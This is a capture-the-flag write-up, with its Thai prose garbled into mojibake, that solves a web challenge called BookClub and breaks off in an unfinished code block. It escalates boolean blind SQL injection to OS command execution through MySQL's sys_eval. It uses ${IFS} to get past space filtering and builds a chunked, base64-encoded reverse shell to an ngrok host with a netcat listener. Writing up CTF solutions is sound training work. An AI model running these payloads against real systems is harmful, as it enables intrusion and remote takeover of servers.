## ‡∏Ç‡πâ‡∏≠ 7. BookClub

> üèÜ **Challenge**: ![Solved](https://img.shields.io/badge/status-solved-brightgreen)  
> üí™ **Difficulty**: üî¥ HARD  
> üéØ **Category**: Web Application Security

<img src="./resources/47.png" alt="" style="width:80% !important;">

## ‡∏Å‡∏≤‡∏£‡∏ß‡∏¥‡πÄ‡∏Ñ‡∏£‡∏≤‡∏∞‡∏´‡πå‡πÄ‡∏ö‡∏∑‡πâ‡∏≠‡∏á‡∏ï‡πâ‡∏ô üîç

‡πÄ‡∏°‡∏∑‡πà‡∏≠‡πÄ‡∏Ç‡πâ‡∏≤‡∏™‡∏π‡πà‡∏´‡∏ô‡πâ‡∏≤‡πÄ‡∏ß‡πá‡∏ö‡πÑ‡∏ã‡∏ï‡πå‡∏Ñ‡∏£‡∏±‡πâ‡∏á‡πÅ‡∏£‡∏Å ‡πÄ‡∏£‡∏≤‡∏û‡∏ö‡∏ß‡πà‡∏≤‡πÄ‡∏õ‡πá‡∏ô‡∏£‡∏∞‡∏ö‡∏ö‡∏Ñ‡πâ‡∏ô‡∏´‡∏≤‡∏´‡∏ô‡∏±‡∏á‡∏™‡∏∑‡∏≠‡∏ó‡∏µ‡πà‡πÉ‡∏ä‡πâ ID ‡πÉ‡∏ô‡∏Å‡∏≤‡∏£‡∏Ñ‡πâ‡∏ô‡∏´‡∏≤ ‡πÇ‡∏î‡∏¢‡∏°‡∏µ‡∏ü‡∏µ‡πÄ‡∏à‡∏≠‡∏£‡πå‡∏´‡∏•‡∏±‡∏Å‡πÜ ‡∏î‡∏±‡∏á‡∏ô‡∏µ‡πâ:
- ‡∏ä‡πà‡∏≠‡∏á‡∏Å‡∏£‡∏≠‡∏Å Book ID ‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö‡∏Ñ‡πâ‡∏ô‡∏´‡∏≤‡∏´‡∏ô‡∏±‡∏á‡∏™‡∏∑‡∏≠
- ‡πÅ‡∏™‡∏î‡∏á‡∏ú‡∏•‡πÉ‡∏ô‡∏£‡∏π‡∏õ‡πÅ‡∏ö‡∏ö‡∏ï‡∏≤‡∏£‡∏≤‡∏á‡∏ó‡∏µ‡πà‡∏°‡∏µ‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏• ID, ‡∏ä‡∏∑‡πà‡∏≠‡∏´‡∏ô‡∏±‡∏á‡∏™‡∏∑‡∏≠ ‡πÅ‡∏•‡∏∞‡∏£‡∏≤‡∏¢‡∏•‡∏∞‡πÄ‡∏≠‡∏µ‡∏¢‡∏î‡∏≠‡∏∑‡πà‡∏ô‡πÜ
- ‡πÑ‡∏°‡πà‡∏°‡∏µ‡∏ü‡∏≠‡∏£‡πå‡∏°‡∏Å‡∏≤‡∏£ login ‡∏´‡∏£‡∏∑‡∏≠‡∏£‡∏∞‡∏ö‡∏ö authentication

<img src="./resources/49.png" alt="" style="width:80% !important;">

## ‡∏Å‡∏≤‡∏£‡∏™‡∏≥‡∏£‡∏ß‡∏à‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏• üïµÔ∏è

#### Directory Enumeration
‡πÉ‡∏ä‡πâ `dirsearch` ‡πÉ‡∏ô‡∏Å‡∏≤‡∏£‡∏Ñ‡πâ‡∏ô‡∏´‡∏≤ paths ‡∏ó‡∏µ‡πà‡∏ô‡πà‡∏≤‡∏™‡∏ô‡πÉ‡∏à:
```bash
dirsearch -u http://35.240.216.137/
```

‡∏û‡∏ö‡πÑ‡∏ü‡∏•‡πå‡∏ó‡∏µ‡πà‡∏ô‡πà‡∏≤‡∏™‡∏ô‡πÉ‡∏à:
- **phpinfo.php** - ‡πÅ‡∏™‡∏î‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏Å‡∏≤‡∏£‡∏ï‡∏±‡πâ‡∏á‡∏Ñ‡πà‡∏≤‡∏ó‡∏±‡πâ‡∏á‡∏´‡∏°‡∏î‡∏Ç‡∏≠‡∏á webserver ‡∏ó‡∏≥‡πÉ‡∏´‡πâ‡πÄ‡∏£‡∏≤‡∏ó‡∏£‡∏≤‡∏ö:
  - PHP Version
  - Enabled Modules
  - System Environment Variables
  - Server Configuration
  
  ** *‡πÅ‡∏ï‡πà‡πÑ‡∏°‡πà‡πÑ‡∏î‡πâ‡∏ä‡πà‡∏ß‡∏¢‡∏≠‡∏∞‡πÑ‡∏£‡πÄ‡∏£‡∏≤‡πÑ‡∏î‡πâ‡πÄ‡∏•‡∏¢!*

<img src="./resources/48.png" alt="" style="width:80% !important;">

## ‡∏Ç‡∏±‡πâ‡∏ô‡∏ï‡∏≠‡∏ô‡∏Å‡∏≤‡∏£‡πÇ‡∏à‡∏°‡∏ï‡∏µ üéØ

#### 1. SQL Injection Testing
&nbsp;&nbsp;&nbsp;&nbsp;‡πÄ‡∏£‡∏¥‡πà‡∏°‡∏ï‡πâ‡∏ô‡∏î‡πâ‡∏ß‡∏¢‡∏Å‡∏≤‡∏£‡∏ó‡∏î‡∏™‡∏≠‡∏ö SQL Injection ‡πÅ‡∏ö‡∏ö‡∏û‡∏∑‡πâ‡∏ô‡∏ê‡∏≤‡∏ô:

&nbsp;&nbsp;&nbsp;&nbsp;- **‡∏ó‡∏î‡∏™‡∏≠‡∏ö UNION-based Injection:**
```bash
# ‡∏ï‡∏±‡∏ß‡∏≠‡∏¢‡πà‡∏≤‡∏á‡∏Ñ‡∏≥‡∏™‡∏±‡πà‡∏á‡πÑ‡∏°‡πà‡∏™‡∏≥‡πÄ‡∏£‡πá‡∏à:
1 UNION SELECT 1,2,3--
1' UNION SELECT 1,2,3,4--
1" UNION SELECT 1,2,3,4--
```

&nbsp;&nbsp;&nbsp;&nbsp;- **‡∏ó‡∏î‡∏™‡∏≠‡∏ö Boolean-based Injection:**
```bash
# ‡∏ï‡∏±‡∏ß‡∏≠‡∏¢‡πà‡∏≤‡∏á‡∏Ñ‡∏≥‡∏™‡∏±‡πà‡∏á‡∏™‡∏≥‡πÄ‡∏£‡πá‡∏à:
1' AND '1' = '1' #  -- Returns true, ‡πÅ‡∏™‡∏î‡∏á‡∏£‡∏≤‡∏¢‡∏Å‡∏≤‡∏£‡∏´‡∏ô‡∏±‡∏á‡∏™‡∏∑‡∏≠‡∏Ç‡∏≠‡∏á ID 1
1' AND '1' != '1' # -- Returns false, ‡πÑ‡∏°‡πà‡πÅ‡∏™‡∏î‡∏á‡∏£‡∏≤‡∏¢‡∏Å‡∏≤‡∏£‡∏´‡∏ô‡∏±‡∏á‡∏™‡∏∑‡∏≠
```

&nbsp;&nbsp;&nbsp;&nbsp;‡∏à‡∏≤‡∏Å‡∏Å‡∏≤‡∏£‡∏ó‡∏î‡∏™‡∏≠‡∏ö‡∏û‡∏ö‡∏ß‡πà‡∏≤:
- Query ‡∏ô‡πà‡∏≤‡∏à‡∏∞‡∏≠‡∏¢‡∏π‡πà‡πÉ‡∏ô‡∏£‡∏π‡∏õ‡πÅ‡∏ö‡∏ö: `SELECT * FROM books WHERE id = '<input>'`
- ‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡πÉ‡∏ä‡πâ Boolean-based injection ‡πÑ‡∏î‡πâ
- ‡∏°‡∏µ‡∏Å‡∏≤‡∏£ escape character ‡∏ö‡∏≤‡∏á‡∏ï‡∏±‡∏ß
- UNION-based injection ‡πÑ‡∏°‡πà‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡πÉ‡∏ä‡πâ‡πÑ‡∏î‡πâ

#### 2. Blind SQL Injection
&nbsp;&nbsp;&nbsp;&nbsp;- ‡πÄ‡∏°‡∏∑‡πà‡∏≠‡∏û‡∏ö‡∏ß‡πà‡∏≤‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡πÉ‡∏ä‡πâ Boolean-based injection ‡πÑ‡∏î‡πâ ‡∏à‡∏∂‡∏á‡∏õ‡∏£‡∏±‡∏ö‡πÅ‡∏ï‡πà‡∏á payload ‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö Blind SQL Injection:

```bash
# Base payload template:
1' AND '{text}' = select substr(@@version,{index},1) #

# Examples:
1' AND '5' = select substr(@@version,1,1) #
1' AND '.' = select substr(@@version,2,1) #
```

<img src="./resources/50.png" alt="" style="width:80% !important;">

&nbsp;&nbsp;&nbsp;&nbsp;**‡∏ú‡∏•‡∏•‡∏±‡∏û‡∏ó‡πå‡∏ó‡∏µ‡πà‡πÑ‡∏î‡πâ:**
- `@@version`: `5.7.33-0ubuntu0.16.04.1`
- `database()`: `book`

&nbsp;&nbsp;&nbsp;&nbsp;- ‡∏ó‡∏î‡∏™‡∏≠‡∏ö‡∏Å‡∏≤‡∏£‡∏ó‡∏≥ Schema enumeration ‡∏û‡∏ß‡∏Å information_schema ,mysql , performance_schema , sys

```bash
- 1' AND '{text}' = select substr(select group_concat(schema_name) from information_schema.schemata,{index},1) #
- 1' AND '{text}' = select substr(select group_concat(table_name) from information_schema.tables,{index},1) #
- 1' AND '{text}' = select substr(select group_concat(column_name) from information_schema.columns,{index},1) #
```
&nbsp;&nbsp;&nbsp;&nbsp;**‡∏ú‡∏•‡∏•‡∏±‡∏û‡∏ó‡πå‡∏ó‡∏µ‡πà‡πÑ‡∏î‡πâ : ‡πÑ‡∏°‡πà‡∏û‡∏ö‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏≠‡∏∞‡πÑ‡∏£‡πÄ‡∏•‡∏¢! ‡∏ô‡∏µ‡πà‡∏°‡∏±‡∏ô‡∏≠‡∏∞‡πÑ‡∏£‡πÄ‡∏ô‡∏µ‡πà‡∏¢?**

#### 3. MySQL Configuration Analysis
‡∏ó‡∏≥‡∏Å‡∏≤‡∏£‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö‡∏Å‡∏≤‡∏£‡∏ï‡∏±‡πâ‡∏á‡∏Ñ‡πà‡∏≤ MySQL ‡πÄ‡∏û‡∏∑‡πà‡∏≠‡∏´‡∏≤‡∏ä‡πà‡∏≠‡∏á‡∏ó‡∏≤‡∏á‡πÉ‡∏ô‡∏Å‡∏≤‡∏£ exploit:

**‡∏ú‡∏•‡∏•‡∏±‡∏û‡∏ó‡πå‡∏Ç‡∏≠‡∏á‡∏Å‡∏≤‡∏£‡∏ï‡∏±‡πâ‡∏á‡∏Ñ‡πà‡∏≤‡∏ó‡∏µ‡πà‡∏û‡∏ö**
```bash
@@plugin_dir = '/usr/lib/mysql/plugin/'
@@secure_file_priv = '/var/lib/mysql-files/'

@@version = '5.7.33-0ubuntu0.16.04.1'
@@datadir = '/var/lib/mysql/'
```

‡∏à‡∏≤‡∏Å‡∏Å‡∏≤‡∏£‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö‡∏û‡∏ö‡∏ß‡πà‡∏≤:
- ‡πÑ‡∏°‡πà‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡πÉ‡∏ä‡πâ `LOAD_FILE()` ‡∏´‡∏£‡∏∑‡∏≠ `INTO OUTFILE` ‡∏ô‡∏≠‡∏Å directory ‡∏ó‡∏µ‡πà‡∏Å‡∏≥‡∏´‡∏ô‡∏î‡πÑ‡∏ß‡πâ‡∏Ñ‡∏∑‡∏≠ /var/lib/mysql-files/
- MySQL version ‡∏Ñ‡πà‡∏≠‡∏ô‡∏Ç‡πâ‡∏≤‡∏á‡πÄ‡∏Å‡πà‡∏≤ ‡∏≠‡∏≤‡∏à‡∏°‡∏µ‡∏ä‡πà‡∏≠‡∏á‡πÇ‡∏´‡∏ß‡πà

#### 4. Command Execution via SQL
&nbsp;&nbsp;&nbsp;&nbsp;‡∏´‡∏•‡∏±‡∏á‡∏à‡∏≤‡∏Å‡πÑ‡∏õ‡∏Å‡∏î hint ‡∏î‡∏π: `You can Command injection via SQL injection` ‡∏à‡∏∂‡∏á‡∏ó‡∏≥‡∏Å‡∏≤‡∏£‡∏Ñ‡πâ‡∏ô‡∏Ñ‡∏ß‡πâ‡∏≤‡πÄ‡∏û‡∏¥‡πà‡∏°‡πÄ‡∏ï‡∏¥‡∏°‡πÅ‡∏•‡∏∞‡∏û‡∏ö:

1. MySQL UDF (User-Defined Functions) ‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡πÉ‡∏ä‡πâ execute system commands ‡πÑ‡∏î‡πâ
2. ‡∏û‡∏ö plugin `sys_eval` ‡∏ó‡∏µ‡πà‡∏ô‡πà‡∏≤‡∏™‡∏ô‡πÉ‡∏à:
   - ‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ execute system commands
   - return output ‡πÄ‡∏õ‡πá‡∏ô string
   - ‡πÑ‡∏°‡πà‡∏ï‡πâ‡∏≠‡∏á compile UDF ‡πÄ‡∏û‡∏¥‡πà‡∏°

<img src="./resources/53.png" alt="" style="width:80% !important;">

**5. Testing Command Execution:**

‡∏ó‡∏î‡∏™‡∏≠‡∏ö command ‡πÄ‡∏û‡∏∑‡πà‡∏≠ show ‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏• user

```bash
# command execution payload:
1' AND '{text}' = (select substr((select hex(select sys_eval('id'))),{index},1)) #

# Result
‡∏™‡∏≥‡πÄ‡∏£‡πá‡∏à ‡∏ó‡∏≥‡∏Å‡∏≤‡∏£ decode hex ‡∏≠‡∏≠‡∏Å‡∏°‡∏≤‡πÑ‡∏î‡πâ‡∏ú‡∏•‡∏•‡∏±‡∏û‡∏ó‡πå user ‡∏ä‡∏∑‡πà‡∏≠ mysql
```
<img src="./resources/51.png" alt="" style="width:80% !important;">
<img src="./resources/52.png" alt="" style="width:80% !important;">

‡∏ó‡∏î‡∏™‡∏≠‡∏ö‡∏•‡∏≠‡∏á‡πÄ‡∏õ‡∏•‡∏µ‡πà‡∏¢‡∏ô‡πÄ‡∏õ‡πá‡∏ô command `ls` ‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ execute ‡πÑ‡∏î‡πâ ‡πÅ‡∏ï‡πà `ls /` ‡πÑ‡∏°‡πà‡πÑ‡∏î‡πâ ‡∏´‡∏£‡∏∑‡∏≠‡∏à‡∏∞‡∏ï‡∏¥‡∏î space

<img src="./resources/54.png" alt="" style="width:80% !important;">

‡∏à‡∏∂‡∏á‡πÄ‡∏õ‡∏•‡∏µ‡πà‡∏¢‡∏ô ‡πÄ‡∏õ‡πá‡∏ô `ls${IFS}/` ‡∏ú‡∏•‡∏Ñ‡∏∑‡∏≠‡∏™‡∏≥‡πÄ‡∏£‡πá‡∏à ‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡πÉ‡∏ä‡πâ ${IFS} ‡πÅ‡∏ó‡∏ô‡∏ä‡πà‡∏≠‡∏á‡∏ß‡πà‡∏≤‡∏á‡πÑ‡∏î‡πâ

<img src="./resources/55.png" alt="" style="width:80% !important;">

‡∏ï‡πà‡∏≠‡πÑ‡∏õ‡∏Å‡πá‡πÑ‡∏õ‡∏•‡∏≠‡∏á‡∏Ñ‡∏≥‡∏™‡∏±‡πà‡∏á‡∏≠‡∏∑‡πà‡∏ô ‡πÜ ‡πÄ‡∏ä‡πà‡∏ô `ls${IFS}book` , `ls${IFS}mysql` , `ls${IFS}/home` , `ls${IFS}/tmp`

**‡∏ú‡∏•‡∏Ñ‡∏∑‡∏≠ :** ‡πÑ‡∏°‡πà‡∏û‡∏ö‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏≠‡∏∞‡πÑ‡∏£‡πÄ‡∏•‡∏¢ ‡πÄ‡∏≠‡∏≤‡∏≠‡∏µ‡∏Å‡πÅ‡∏•‡πâ‡∏ß‡πÄ‡∏Å‡∏¥‡∏î‡∏≠‡∏∞‡πÑ‡∏£‡∏Ç‡∏∂‡πâ‡∏ô‡πÄ‡∏ô‡∏µ‡πà‡∏¢! ‡∏´‡∏£‡∏∑‡∏≠‡∏à‡∏∞‡∏ï‡∏¥‡∏î privilege ‡∏´‡∏£‡∏∑‡∏≠‡∏õ‡πà‡∏≤‡∏ß ‡πÑ‡∏°‡πà‡∏ô‡πà‡∏≤‡∏à‡∏∞‡πÄ‡∏Å‡∏µ‡πà‡∏¢‡∏ß‡∏ô‡∏∞

‡∏à‡∏∂‡∏á‡∏ó‡∏î‡∏•‡∏≠‡∏á‡πÉ‡∏ä‡πâ command `echo` ‡πÄ‡∏û‡∏∑‡πà‡∏≠‡∏à‡∏∞ print ‡∏Ç‡πâ‡∏≠‡∏Ñ‡∏ß‡∏≤‡∏°‡∏î‡∏π‡∏Å‡πà‡∏≠‡∏ô‡∏õ‡∏£‡∏≤‡∏Å‡∏é‡∏ß‡πà‡∏≤
- `echo 1` ‡∏™‡∏≥‡πÄ‡∏£‡πá‡∏à
- `echo 11` ‡∏™‡∏≥‡πÄ‡∏£‡πá‡∏à
- `echo 1111` ‡∏™‡∏≥‡πÄ‡∏£‡πá‡∏à
- `echo` ‡πÑ‡∏õ‡πÄ‡∏£‡∏∑‡πà‡∏≠‡∏¢‡πÜ ‡∏¢‡∏≤‡∏ß‡πÜ ‡πÑ‡∏õ ‡∏à‡∏ô‡πÑ‡∏°‡πà‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡πÉ‡∏ä‡πâ‡∏Ñ‡∏≥‡∏™‡∏±‡πà‡∏á echo ‡πÑ‡∏î‡πâ ‡πÅ‡∏™‡∏î‡∏á‡∏ß‡πà‡∏≤ ‡∏°‡∏µ‡∏Å‡∏≤‡∏£ limit ‡∏Ñ‡∏ß‡∏≤‡∏°‡∏¢‡∏≤‡∏ß‡∏Ç‡∏≠‡∏á payload ‡∏ó‡∏µ‡πà‡∏™‡πà‡∏á‡πÑ‡∏õ‡πÅ‡∏ô‡πà‡πÜ

- ‡∏à‡∏∂‡∏á‡∏ó‡∏≥‡∏Å‡∏≤‡∏£‡∏•‡∏î‡∏£‡∏π‡∏õ‡∏Ç‡∏≠‡∏á query ‡∏•‡∏á‡∏ã‡∏∞ ‡∏ï‡∏£‡∏á‡πÑ‡∏´‡∏ô‡πÑ‡∏°‡πà‡πÄ‡∏ß‡πâ‡∏ô‡∏ß‡∏£‡∏£‡∏Ñ‡πÑ‡∏î‡πâ ‡∏ï‡∏±‡∏î‡∏ß‡∏á‡πÄ‡∏•‡πá‡∏ö‡πÄ‡∏Å‡∏¥‡∏ô‡πÜ ‡∏≠‡∏≠‡∏Å ‡∏Å‡πá‡∏à‡∏∞‡πÄ‡∏´‡∏•‡∏∑‡∏≠‡πÅ‡∏Ñ‡πà
```bash
1' AND ''=(select sys_eval('<command>'))#
```

‡∏à‡∏≤‡∏Å‡∏Å‡∏≤‡∏£‡∏ó‡∏î‡∏™‡∏≠‡∏ö ‡∏û‡∏ö‡∏Ç‡πâ‡∏≠‡∏à‡∏≥‡∏Å‡∏±‡∏î‡∏´‡∏•‡∏≤‡∏¢‡∏≠‡∏¢‡πà‡∏≤‡∏á‡∏ó‡∏µ‡πà‡∏ï‡πâ‡∏≠‡∏á‡πÅ‡∏Å‡πâ‡πÑ‡∏Ç:

1. **Query Length Limitation:**
   - ‡∏û‡∏ö‡∏ß‡πà‡∏≤‡∏à‡∏∞‡πÉ‡∏™‡πà query ‡∏¢‡∏≤‡∏ß‡πÜ ‡πÑ‡∏°‡πà‡πÑ‡∏î‡πâ ‡∏°‡∏µ‡∏Å‡∏≤‡∏£‡∏à‡∏≥‡∏Å‡∏±‡∏î‡∏Ñ‡∏ß‡∏≤‡∏°‡∏¢‡∏≤‡∏ß‡∏Ç‡∏≠‡∏á payload
   - ‡∏ï‡πâ‡∏≠‡∏á‡∏ó‡∏≥‡∏Å‡∏≤‡∏£‡∏¢‡πà‡∏≠ payload ‡πÉ‡∏´‡πâ‡∏™‡∏±‡πâ‡∏ô‡∏ó‡∏µ‡πà‡∏™‡∏∏‡∏î

2. **Space Character Filtering:**
   - ‡πÉ‡∏ä‡πâ `${IFS}` ‡πÅ‡∏ó‡∏ô space
   - ‡∏ï‡∏±‡∏ß‡∏≠‡∏¢‡πà‡∏≤‡∏á: `ls${IFS}/` ‡πÅ‡∏ó‡∏ô `ls /`

#### 6. Reverse Shell Setup
‡∏à‡∏∂‡∏á‡∏Ñ‡∏¥‡∏î‡∏ß‡∏≤‡∏á‡πÅ‡∏ú‡∏ô‡∏à‡∏∞‡∏ó‡∏≥ reverse shell: ‡πÅ‡∏ï‡πà‡∏à‡∏∞‡πÉ‡∏™‡πà payload ‡∏ó‡∏±‡πâ‡∏á‡∏´‡∏°‡∏î‡πÑ‡∏°‡πà‡πÑ‡∏î‡πâ‡πÅ‡∏ô‡πà‡πÜ ‡πÄ‡∏û‡∏£‡∏≤‡∏∞‡πÇ‡∏î‡∏ô‡∏à‡∏≥‡∏Å‡∏±‡∏î‡∏Ñ‡∏ß‡∏≤‡∏°‡∏¢‡∏≤‡∏ß‡∏Ç‡∏≠‡∏á payload 

1. **Setup Listener:**
   ```bash
   # Start ngrok for tunneling
   ngrok tcp 4444

   # Setup netcat listener
   nc -lvnp 4444
   ```
   
   <img src="./resources/58.png" alt="" style="width:90% !important;">

2. **Generate Payload:**
   - ‡πÉ‡∏ä‡πâ [revshells.com](https://www.revshells.com/) ‡∏™‡∏£‡πâ‡∏≤‡∏á payload
   
   <img src="./resources/58_2.png" alt="" style="width:90% !important;">

#### 7. Payload Construction & Execution
‡∏Ç‡∏±‡πâ‡∏ô‡∏ï‡∏≠‡∏ô‡∏Å‡∏≤‡∏£‡∏™‡∏£‡πâ‡∏≤‡∏á‡πÅ‡∏•‡∏∞ execute reverse shell:

- ‡πÄ‡∏ô‡∏∑‡πà‡∏≠‡∏á‡∏à‡∏≤‡∏Å‡∏ñ‡∏π‡∏Å length limit ‡πÑ‡∏ß‡πâ ‡∏à‡∏∂‡∏á‡∏ï‡πâ‡∏≠‡∏á‡πÉ‡∏ä‡πâ‡∏ß‡∏¥‡∏ò‡∏µ‡∏Å‡∏≤‡∏£‡πÄ‡∏Ç‡∏µ‡∏¢‡∏ô‡πÑ‡∏ü‡∏•‡πå‡∏ó‡∏µ‡∏•‡∏∞‡∏™‡πà‡∏ß‡∏ô ‡πÇ‡∏î‡∏¢‡∏à‡∏∞‡πÉ‡∏´‡πâ‡∏Ñ‡∏ß‡∏≤‡∏°‡∏¢‡∏≤‡∏ß‡∏Ç‡∏≠‡∏á payload ‡πÑ‡∏°‡πà‡πÄ‡∏Å‡∏¥‡∏ô 65
    ```bash
    #‡πÉ‡∏ä‡πâ echo ‡πÄ‡∏Ç‡∏µ‡∏¢‡∏ô‡πÑ‡∏ü‡∏•‡πå ‡πÇ‡∏î‡∏¢‡πÉ‡∏ä‡πâ‡∏ä‡∏∑‡πà‡∏≠‡πÑ‡∏ü‡∏•‡πå a

    1 AND ''=(select sys_eval('echo${IFS}"/bin/bash -i "'>a))#
    1 AND ''=(select sys_eval('echo${IFS}">& /dev/tcp/0."'>>a))#
    1 AND ''=(select sys_eval('echo${IFS}"tcp.ap.ngrok.io"'>>a))#
    1 AND ''=(select sys_eval('echo${IFS}"/13760 0>&1"'>>a))#
    ```

- ‡∏ô‡∏≥ payload ‡∏ó‡∏±‡πâ‡∏á‡∏´‡∏°‡∏î‡πÑ‡∏õ‡∏ó‡∏î‡∏™‡∏≠‡∏ö ‡πÅ‡∏ï‡πà‡∏õ‡∏£‡∏≤‡∏Å‡∏é‡∏ß‡πà‡∏≤ payload ‡∏ö‡∏≤‡∏á‡∏≠‡∏±‡∏ô‡πÉ‡∏ä‡πâ‡πÑ‡∏°‡πà‡πÑ‡∏î‡πâ ‡∏´‡∏£‡∏∑‡∏≠‡∏≠‡∏≤‡∏à‡∏à‡∏∞‡∏°‡∏µ filter ‡∏≠‡∏±‡∏Å‡∏Ç‡∏£‡∏∞‡∏≠‡∏∞‡πÑ‡∏£‡∏≠‡∏µ‡∏Å‡∏£‡∏∂‡∏õ‡πà‡∏≤‡∏ß
- ‡∏à‡∏∂‡∏á‡∏ó‡∏≥‡∏Å‡∏≤‡∏£‡πÄ‡∏õ‡∏•‡∏µ‡πà‡∏¢‡∏ô command ‡πÉ‡∏´‡∏°‡πà ‡πÇ‡∏î‡∏¢ encode command ‡πÉ‡∏ô‡∏™‡πà‡∏ß‡∏ô‡∏Ç‡∏≠‡∏á reverse shell ‡πÄ‡∏õ‡πá‡∏ô base64 ‡∏Å‡πà‡∏≠‡∏ô‡πÄ‡∏û‡∏∑‡πà‡∏≠‡∏´‡∏•‡∏µ‡∏Å‡πÄ‡∏•‡∏µ‡πà‡∏¢‡∏á special characters
    ```bash
    echo${IFS}L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzAudGNwLmFwLm5ncm9rLmlvLzEzNzYwIDA+JjE=|bass64${IFS}-d|bash${IFS}-i
    ```      
- ‡πÄ‡∏≠‡∏≤ payload ‡∏°‡∏≤‡πÅ‡∏ö‡πà‡∏á‡∏™‡πà‡∏ß‡∏ô‡πÄ‡∏´‡∏°‡∏∑‡∏≠‡∏ô‡πÄ‡∏î‡∏¥‡∏° 

    ```bash
    #‡πÉ‡∏ä‡πâ echo ‡πÄ‡∏Ç‡∏µ‡∏¢‡∏ô‡πÑ‡∏ü‡∏•‡πå ‡πÇ‡∏î‡∏¢‡πÉ‡∏ä‡πâ‡∏ä‡∏∑‡πà‡∏≠‡πÑ‡∏ü‡∏•‡πå a

    1 AND ''=(select sys_eval('echo${IFS}"L2Jpbi9iYXNoIC1">a'))#
    1 AND ''=(select sys_eval('echo${IFS}"pID4mIC9kZX">>a'))#
    1 AND ''=(select sys_eval('echo${IFS}"XYvdGNwLzAudGNwL">>a'))#
    ......
    1 AND ''=(select sys_eval('echo${IFS}"|base64${IFS}-d">>a'))#
    1 AND ''=(select sys_eval('echo${IFS}"|bash${IFS}-i">>a'))#
    ```

- ‡πÄ‡∏°‡∏∑‡πà‡∏≠‡∏™‡πà‡∏á payload ‡∏ó‡∏±‡πâ‡∏á‡∏´‡∏°‡∏î‡πÑ‡∏î‡πâ‡∏™‡∏≥‡πÄ‡∏£‡πá‡∏à ‡∏Å‡πá‡∏•‡∏≠‡∏á‡πÑ‡∏õ‡∏≠‡πà‡∏≤‡∏ô‡πÑ‡∏ü‡∏•‡πå `a` ‡∏ó‡∏µ‡πà‡πÄ‡∏Ç‡∏µ‡∏¢‡∏ô‡πÑ‡∏ß‡πâ ‡∏î‡∏π‡∏Å‡πà‡∏≠‡∏ô ‡∏õ‡∏£‡∏≤‡∏Å‡∏é‡∏ß‡πà‡∏≤ ‡∏°‡∏µ‡πÑ‡∏ü‡∏•‡πå‡∏ñ‡∏π‡∏Å‡πÄ‡∏Ç‡∏µ‡∏¢‡∏ô‡∏à‡∏£‡∏¥‡∏á ‡πÅ‡∏ï‡πà...

    ```bash
    #‡∏Ç‡πâ‡∏≠‡∏Ñ‡∏ß‡∏≤‡∏°‡πÉ‡∏ô‡πÑ‡∏ü‡∏•‡πå‡∏ï‡∏¥‡∏î‡∏Å‡∏±‡∏ô ‡πÅ‡∏•‡∏∞‡∏ñ‡∏π‡∏Å‡∏Ç‡∏∂‡πâ‡∏ô‡∏ö‡∏£‡∏£‡∏ó‡∏±‡∏î‡πÉ‡∏´‡∏°‡πà ‡πÑ‡∏°‡πà‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡πÉ‡∏ä‡πâ‡πÑ‡∏î‡πâ

    echoL2Jpbi9iYXNoIC1
    pID4mIC9kZX
    YvdGNwLzAudGNwL
    mFwLm5ncm9rLmlv
    LzEzNzYwIDA+JjE=
    |bass64-d
    |bash-i
    ```

- ‡πÄ‡∏≠‡∏≤‡πÉ‡∏´‡∏°‡πà‡∏≠‡∏µ‡∏Å‡∏Ñ‡∏£‡∏±‡πâ‡∏á encode ‡∏ó‡∏±‡πâ‡∏á‡∏´‡∏°‡∏î‡∏ô‡∏µ‡πâ‡πÅ‡∏´‡∏•‡∏∞ ‡πÄ‡∏õ‡πá‡∏ô base64 ‡πÑ‡∏õ‡πÄ‡∏•‡∏¢ ‡∏ó‡∏µ‡πà‡∏ô‡∏µ‡πâ‡πÄ‡∏Ç‡∏µ‡∏¢‡∏ô code python ‡πÉ‡∏´‡πâ‡∏ä‡πà‡∏ß‡∏¢‡πÅ‡∏ö‡πà‡∏á payload ‡πÉ‡∏´‡πâ‡πÄ‡∏•‡∏¢
  ‡πÅ‡∏•‡∏∞‡πÄ‡∏õ‡∏•‡∏µ‡πà‡∏¢‡∏ô‡∏Ñ‡∏≥‡∏™‡∏±‡πà‡∏á `echo` ‡πÄ‡∏õ‡πá‡∏ô `printf` ‡πÅ‡∏ó‡∏ô

    <img src="./resources/57.png" alt="" style="width:90% !important;">


- ‡πÄ‡∏°‡∏∑‡πà‡∏≠‡∏™‡πà‡∏á payload ‡∏ó‡∏±‡πâ‡∏á‡∏´‡∏°‡∏î‡πÅ‡∏•‡πâ‡∏ß‡∏Å‡πá‡πÑ‡∏õ‡∏™‡∏±‡πà‡∏á decode ‡πÑ‡∏ü‡∏•‡πå `a` ‡∏ó‡∏µ‡πà‡πÄ‡∏õ‡πá‡∏ô base64 ‡∏Å‡∏•‡∏±‡∏ö‡πÄ‡∏õ‡πá‡∏ô‡∏Ç‡πâ‡∏≠‡∏Ñ‡∏ß‡∏≤‡∏°‡πÄ‡∏î‡∏¥‡∏° ‡∏î‡πâ‡∏ß‡∏¢‡∏Ñ‡∏≥‡∏™‡∏±‡πà‡∏á `base64 -d` ‡πÅ‡∏•‡πâ‡∏ß save ‡πÄ‡∏õ‡πá‡∏ô‡πÑ‡∏ü‡∏•‡πå‡πÉ‡∏´‡∏°‡πà‡∏ä‡∏∑‡πà‡∏≠‡πÑ‡∏ü‡∏•‡πå `b`
    ```bash
